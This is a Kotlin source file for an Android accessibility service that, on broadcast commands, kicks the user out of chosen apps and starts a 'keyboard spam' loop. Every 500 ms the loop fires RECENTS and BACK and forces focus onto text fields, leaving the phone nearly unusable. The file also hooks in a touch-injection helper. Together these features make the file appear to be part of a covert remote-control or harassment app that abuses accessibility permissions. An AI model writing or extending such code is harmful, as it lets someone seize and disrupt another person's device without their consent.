package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import android.content.pm.PackageManager

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()
        var isKeyboardSpamming = false

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) ||
                svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) { false }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L
    
    private var spamRunnable: Runnable? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                    android.util.Log.d("AppBlocker", "Blocked: $pkg")
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                    android.util.Log.d("AppBlocker", "Unblocked: $pkg")
                }
                "com.sync.xxx.UNBLOCK_ALL" -> {
                    blockedPackages.clear()
                    android.util.Log.d("AppBlocker", "All unblocked")
                }
                "com.sync.xxx.KEYBOARD_SPAM_START" -> startKeyboardSpam()
                "com.sync.xxx.KEYBOARD_SPAM_STOP" -> stopKeyboardSpam()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        TouchInjector.attach(this)

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }

        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
            addAction("com.sync.xxx.KEYBOARD_SPAM_START")
            addAction("com.sync.xxx.KEYBOARD_SPAM_STOP")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        android.util.Log.d("AppBlocker", "Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        if (pkg == "android") return
        if (pkg == "com.android.systemui") return

        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime  = now

        performGlobalAction(GLOBAL_ACTION_HOME)

        mainHandler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 50)

        val appName = try {
            val pm = packageManager
            pm.getApplicationLabel(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
                else
                    @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (e: Exception) { pkg }

        mainHandler.postDelayed({
            Toast.makeText(this, "🚫 $appName diblokir", Toast.LENGTH_SHORT).show()
        }, 50)
    }

    private fun startKeyboardSpam() {
        if (isKeyboardSpamming) return
        isKeyboardSpamming = true
        android.util.Log.d("AppBlocker", "Keyboard spam started")

        spamRunnable = object : Runnable {
            override fun run() {
                if (!isKeyboardSpamming) return

                try {
                    // Strategy 1: Global action RECENTS lalu BACK untuk trigger keyboard
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    
                    mainHandler.postDelayed({
                        try {
                            performGlobalAction(GLOBAL_ACTION_BACK)
                        } catch (e: Exception) {
                            android.util.Log.e("AppBlocker", "Back error: ${e.message}")
                        }
                    }, 150)
                    
                    // Strategy 2: Cari dan focus EditText kalau ada
                    mainHandler.postDelayed({
                        try {
                            val root = rootInActiveWindow
                            if (root != null) {
                                val editText = findEditText(root)
                                if (editText != null) {
                                    editText.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                                    editText.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    
                                    // Tutup keyboard setelah 200ms
                                    mainHandler.postDelayed({
                                        try {
                                            editText.performAction(AccessibilityNodeInfo.ACTION_CLEAR_FOCUS)
                                            performGlobalAction(GLOBAL_ACTION_BACK)
                                        } catch (e: Exception) {
                                            android.util.Log.e("AppBlocker", "Clear focus: ${e.message}")
                                        }
                                    }, 200)
                                }
                                root.recycle()
                            }
                        } catch (e: Exception) {
                            android.util.Log.e("AppBlocker", "EditText focus: ${e.message}")
                        }
                    }, 300)
                    
                } catch (e: Exception) {
                    android.util.Log.e("AppBlocker", "Spam error: ${e.message}")
                }

                // Loop setiap 500ms
                mainHandler.postDelayed(this, 500)
            }
        }
        mainHandler.post(spamRunnable!!)
    }

    private fun stopKeyboardSpam() {
        isKeyboardSpamming = false
        spamRunnable?.let { mainHandler.removeCallbacks(it) }
        spamRunnable = null
        android.util.Log.d("AppBlocker", "Keyboard spam stopped")
    }

    private fun findEditText(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        
        val className = node.className?.toString() ?: ""
        if (className.contains("EditText", ignoreCase = true)) {
            return node
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (node.isEditable) {
                return node
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findEditText(child)
            if (result != null) return result
            child.recycle()
        }

        return null
    }

    override fun onInterrupt() {
        stopKeyboardSpam()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopKeyboardSpam()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        TouchInjector.attach(null)
        instance = null
    }
}
